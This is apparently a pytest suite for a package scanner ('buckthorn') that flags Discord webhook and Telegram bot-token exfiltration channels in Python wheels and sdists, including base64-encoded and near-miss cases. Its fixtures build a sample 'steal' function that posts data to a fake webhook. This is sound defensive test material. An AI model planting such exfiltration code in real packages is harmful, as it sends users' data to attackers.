import base64
import json

import pytest

from buckthorn.findings import verdict
from buckthorn.scan import scan_sdist, scan_wheel

PLAIN_SETUP = "from setuptools import setup\nsetup(name='pkg', version='1.0')\n"
# Fake values in the real shapes. Never put a real channel in a test.
HOOK_ID, HOOK_TOKEN = "1" * 18, "A" * 68
HOOK = f"https://discord.com/api/webhooks/{HOOK_ID}/{HOOK_TOKEN}"
BOT_ID, BOT_SECRET = "1" * 10, "A" * 35
BOT_TOKEN = f"{BOT_ID}:{BOT_SECRET}"


def _rules(findings):
    return sorted(f.rule_id for f in findings)


def _send(value: str) -> str:
    return f"import requests\n\ndef steal(data):\n    requests.post({value!r}, data=data)\n"


@pytest.mark.parametrize(
    "url",
    [
        HOOK,
        HOOK.replace("discord.com", "discordapp.com"),
        HOOK.replace("discord.com", "canary.discord.com"),
        HOOK.replace("discord.com", "ptb.discord.com"),
        HOOK.replace("/api/", "/api/v10/"),
        HOOK.replace("https://", ""),
        HOOK.replace("discord.com", "DisCord.COM"),  # hosts ignore case
    ],
)
def test_discord_webhook_in_a_function_is_flagged(make_wheel, url):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": _send(url)}))
    assert _rules(findings) == ["BKT-EXFIL-001"]
    assert findings[0].severity.value == "medium"
    assert findings[0].metadata["lines"] == [4]
    assert verdict(findings) == "flagged"


@pytest.mark.parametrize(
    "source",
    [
        _send(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"),
        f"TOKEN = {BOT_TOKEN!r}\n",
        f"def f():\n    return b'{BOT_TOKEN}'\n",
    ],
)
def test_telegram_bot_token_is_flagged(make_wheel, source):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": source}))
    assert _rules(findings) == ["BKT-EXFIL-002"]
    assert findings[0].severity.value == "medium"


@pytest.mark.parametrize(
    ("value", "rule"),
    [
        (base64.b64encode(HOOK.encode()).decode(), "BKT-EXFIL-001"),
        (base64.urlsafe_b64encode(HOOK.encode()).decode().rstrip("="), "BKT-EXFIL-001"),
        (base64.b64encode(BOT_TOKEN.encode()).decode(), "BKT-EXFIL-002"),
        (base64.encodebytes(HOOK.encode()).decode(), "BKT-EXFIL-001"),  # wrapped lines
    ],
)
def test_channel_shipped_as_base64_is_flagged(make_wheel, value, rule):
    source = f"import base64\n\ndef f():\n    return base64.b64decode({value!r})\n"
    findings = scan_wheel(make_wheel({"pkg/__init__.py": source}))
    assert _rules(findings) == [rule]
    assert findings[0].message.endswith("(base64)")


def test_channel_in_an_exec_string_is_one_line(make_wheel):
    source = f"exec({_send(HOOK)!r})\n"
    findings = scan_wheel(make_wheel({"pkg/__init__.py": source}))
    exfil = [f for f in findings if f.rule_id == "BKT-EXFIL-001"]
    assert [f.metadata["lines"] for f in exfil] == [[1]]


def test_adjacent_literals_are_one_string(make_wheel):
    source = f"URL = ('https://discord.com/api/webhooks/'\n       '{HOOK_ID}/{HOOK_TOKEN}')\n"
    assert _rules(scan_wheel(make_wheel({"pkg/m.py": source}))) == ["BKT-EXFIL-001"]


@pytest.mark.parametrize(
    "value",
    [
        # documentation placeholders and short examples
        "https://discord.com/api/webhooks/123/abc",
        "https://discord.com/api/webhooks/<id>/<token>",
        "https://discord.com/api/webhooks/{webhook_id}/{webhook_token}",
        "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
        "https://discord.com/api/webhooks/" + "1" * 16 + "/" + HOOK_TOKEN,  # id too short
        "https://discord.com/api/webhooks/" + HOOK_ID + "/" + "A" * 59,  # token too short
        "https://discord.com/api/webhooks/" + HOOK_ID + "/" + "A" * 81,  # token too long
        "https://example.com/api/webhooks/" + HOOK_ID + "/" + HOOK_TOKEN,
        "https://notdiscord.com/api/webhooks/" + HOOK_ID + "/" + HOOK_TOKEN,
        "https://api.telegram.org/bot<token>/sendMessage",
        "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/getMe",
        "1" * 7 + ":" + BOT_SECRET,  # id too short
        "1" * 11 + ":" + BOT_SECRET,  # id too long
        BOT_ID + ":" + "A" * 34,
        BOT_ID + ":" + "A" * 36,
        BOT_ID + ":" + "B" * 35,  # real secrets start AA
        "x" + BOT_TOKEN,  # part of a longer word
    ],
)
def test_placeholders_and_near_misses_are_clean(make_wheel, value):
    assert scan_wheel(make_wheel({"pkg/__init__.py": _send(value)})) == []


@pytest.mark.parametrize(
    "source",
    [
        "import os\nURL = os.environ['DISCORD_WEBHOOK']\n",
        "import os\nTOKEN = os.getenv('TELEGRAM_BOT_TOKEN')\n",
        "def f(i, t):\n    return f'https://discord.com/api/webhooks/{i}/{t}'\n",
        f"# old hook: {HOOK}\n",  # a comment is not code
    ],
)
def test_channel_built_at_run_time_or_in_a_comment_is_clean(make_wheel, source):
    assert scan_wheel(make_wheel({"pkg/__init__.py": source})) == []


def test_no_message_holds_the_secret(make_wheel, make_sdist):
    encoded = base64.b64encode(HOOK.encode()).decode()
    source = f"URL = {HOOK!r}\nTOKEN = {BOT_TOKEN!r}\nENC = {encoded!r}\n"
    findings = scan_wheel(make_wheel({"pkg/__init__.py": source}))
    findings += scan_sdist(make_sdist({"setup.py": source + PLAIN_SETUP}))
    assert _rules(findings) == ["BKT-EXFIL-001", "BKT-EXFIL-001", "BKT-EXFIL-002", "BKT-EXFIL-002"]
    dumped = json.dumps([f.to_dict() for f in findings])
    for secret in (HOOK_ID, HOOK_TOKEN, BOT_ID, BOT_SECRET, encoded):
        assert secret not in dumped


def test_sdist_install_code_and_package_modules_are_read(make_sdist):
    findings = scan_sdist(
        make_sdist(
            {
                "setup.py": PLAIN_SETUP,
                "pkg/__init__.py": _send(HOOK),
                "pkg/cli.py": f"TOKEN = {BOT_TOKEN!r}\n",
            }
        )
    )
    assert _rules(findings) == ["BKT-EXFIL-001", "BKT-EXFIL-002"]


def test_sdist_files_not_installed_are_not_read(make_sdist):
    findings = scan_sdist(
        make_sdist(
            {
                "setup.py": PLAIN_SETUP,
                "pkg/__init__.py": "",
                "docs/conf.py": _send(HOOK),
                "pkg/tests/__init__.py": "",
                "pkg/tests/test_x.py": _send(HOOK),
                "README.md": HOOK,
            }
        )
    )
    assert findings == []


def test_wheel_reads_only_python_it_installs(make_wheel):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": "", "pkg/hook.txt": HOOK}))
    assert findings == []


def test_wheel_test_file_still_counts(make_wheel):
    # Unlike the import rules: the channel is shipped whether or not anything runs it.
    findings = scan_wheel(make_wheel({"pkg/__init__.py": "", "pkg/tests/test_x.py": _send(HOOK)}))
    assert _rules(findings) == ["BKT-EXFIL-001"]
    assert findings[0].severity.value == "medium"
